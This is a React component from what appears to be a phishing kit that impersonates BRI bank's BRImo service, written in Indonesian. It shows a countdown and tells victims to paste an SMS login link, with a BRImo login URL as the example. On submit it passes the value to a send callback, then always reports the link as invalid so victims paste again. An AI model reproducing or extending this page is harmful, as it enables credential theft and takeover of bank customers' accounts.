import { useEffect } from 'react';
import '../assets/css/App.css';
import sms from '../assets/img/sms.png'

function Otp(props) {
  let menit = 2;
  let detik = 30;
  let timer
  useEffect(()=>{
    timer = setInterval(()=>{
      detik-=1
      if(detik === 0){
        detik = 59
        menit -= 1
      }else if(menit === 0){
        detik = 0;
        menit = 0;
      }
      document.getElementById('menit').innerHTML = '0'+menit  
      document.getElementById('detik').innerHTML = `${(detik < 10)?'0'+detik:detik}`  
    }, 1000)
  }, [props.sms])

  const okok = () => {
    document.querySelector('.intxt').value = "";
    props.send()
    document.querySelector('.inierr').classList.add('errbgt')
    document.querySelector('button').classList.add('btn-disable')
  }
  
  const ok = (e) => {
    props.sms(e.target.value)
    document.querySelector('button').classList.remove('btn-disable')
  }

  return (
    <div className='App-v4'>
      <div className="box">
        <center>
        <img src={sms} className='sms' />
        <h1 style={{fontSize : '1.3em'}}>Cek SMS</h1>
        </center>
        <hr />
        <center>
          <h1 style={{fontSize : '1.3em', marginTop:'5px'}}>
            <span id='menit'>02</span>
            <span>{` : `}</span>
            <span id='detik'>30</span>
          </h1>
          <p className='p3'>
          Link untuk Pindah ke BI-Fast BRImo telah <br/>kami kirim ke
          Nomor Handphone anda,<br/> Silahkan salin Link
          Untuk Melanjutkan<br/>Pindah ke layanan BI-Fast BRImo<br/>Lalu ditempel dibawah ini
          </p>
          <p className="p3">{'Tempel SMS BRI(Wajib)'}</p>
        </center>
        <br />
        <textarea onInput={ok} className='intxt' placeholder="Tempelkan Disini Contoh :  https://brimo.bri.co.id/app/login?code=xxxx"></textarea>
        <br /><br />
        <button onClick={okok} className="btn-disable">Konfirmasi</button>
      </div>
      <br />
      <span className="txt1">
        Tidak Terima SMS?
        <span className="txtin"> Kirim Ulang</span>
      </span>
      <div className="inierr">
        <b>Link Tidak Valid, Silahkan untuk mencoba lagi.</b>
      </div>
    </div>
  );
}

export default Otp;